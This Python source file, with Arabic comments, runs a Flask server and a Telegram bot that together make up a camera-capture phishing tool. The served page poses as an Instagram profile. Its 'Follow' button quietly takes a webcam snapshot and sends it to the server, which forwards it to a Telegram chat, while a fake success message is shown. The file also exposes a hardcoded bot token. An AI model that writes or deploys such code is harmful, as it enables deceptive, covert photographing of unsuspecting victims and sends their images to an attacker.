import os
import asyncio
import threading
import base64
import requests
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

app = Flask(__name__)

# بياناتك الصحيحة من الصور السابقة
BOT_TOKEN = 8664732759:AAEjhYPpopZn_QDY2udIAbO1v33JQeDlsmE
CHAT_ID = "6691718718"
WEB_URL = "https://shado-bot.onrender.com"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: sans-serif; background: #fafafa; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .follow-btn { background: #0095f6; color: white; border: none; border-radius: 4px; padding: 8px 30px; font-weight: bold; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <img src="https://i.ibb.co/S7Vn5mY/profile.jpg" style="width:80px; border-radius:50%;">
    <h2>_hqrn</h2>
    <button class="follow-btn" id="startBtn">Follow</button>
    <script>
        document.getElementById('startBtn').onclick = () => {
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    fetch('/upload', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ image: canvas.toDataURL('image/jpeg') })
                    });
                    alert("تمت المتابعة بنجاح");
                }, 2000);
            });
        };
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json.get('image')
    if data:
        img_data = base64.b64decode(data.split(",")[1])
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
                      data={'chat_id': CHAT_ID}, files={'photo': ('shot.jpg', img_data)})
    return jsonify({"status": "ok"})

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("📸 فتح الرابط", url=WEB_URL)]]
    await update.message.reply_text("مرحباً شادو، اضغط لفتح الرابط:", reply_markup=InlineKeyboardMarkup(keyboard))

# دالة لتشغيل البوت في الخلفية
def run_telegram_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.run_polling()

if __name__ == '__main__':
    # تشغيل البوت في خيط منفصل
    threading.Thread(target=run_telegram_bot, daemon=True).start()
    # تشغيل Flask
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
